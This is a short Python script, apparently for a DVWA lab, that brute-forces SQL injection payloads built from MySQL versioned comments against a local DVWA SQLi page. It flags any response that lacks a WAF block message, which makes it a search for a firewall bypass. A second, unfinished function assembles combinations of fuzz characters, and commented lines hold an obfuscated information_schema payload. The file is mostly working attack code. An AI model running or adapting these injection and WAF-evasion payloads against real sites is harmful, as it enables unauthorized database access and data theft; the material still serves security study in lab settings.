import requests
from fake_useragent import UserAgent
#设置cookie
cookies = "security=low; PHPSESSID=6arlml0daogk8s5p23qgm2bvb4"
#设置协议头
headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
    "Cookie": "security=low; PHPSESSID=6arlml0daogk8s5p23qgm2bvb4"
}
#循环fuzz爆破
for i in range(10000,15000):
    reture = "http://10.211.55.3/dvwa/vulnerabilities/sqli/?id=1%27%2F*%21" + str(i) + "and*%2F+%27a%27%3D%27a+--%2B&Submit=Submit"
    r = requests.get(reture, headers=headers).text
    key = "攻击请求"
    ss = r.find(key)
    if ss == -1 :
        print("fuzz is ok!url is :")
        print(reture)

def fuzz(url):
  fuzzing_x = ['/*', '*/', '/*!', '*', '=', '`', '!', '@', '%', '.', '-', '+', '|', '%00']
  fuzzing_y = ['', ' ']
  fuzzing_z = ["%0a", "%0b", "%0c", "%0d", "%0e", "%0f", "%0g", "%0h", "%0i", "%0j"]
  fuzz = fuzzing_x + fuzzing_y + fuzzing_z
  ua = UserAgent()
  headers = ua.firefox
  for a in fuzz:
      for b in fuzz:
          for c in fuzz:
              for d in fuzz:
                  exp = "/*!" + a + b + c + d + "and*/'a'='a--+"









#reture = "http://172.20.10.4/dvwa/vulnerabilities/sqli/?id=1%27%2F*%2110000and*%2F+%27a%27%3D%27a+--%2B&Submit=Submit"
# print(r)
# payload=payload.replace("information_schema.","%20%20/*!%20%20%20%20INFOrMATION_SCHEMa%20%20%20%20*/%20%20/*^x^^x^*/%20/*!.*/%20/*^x^^x^*/")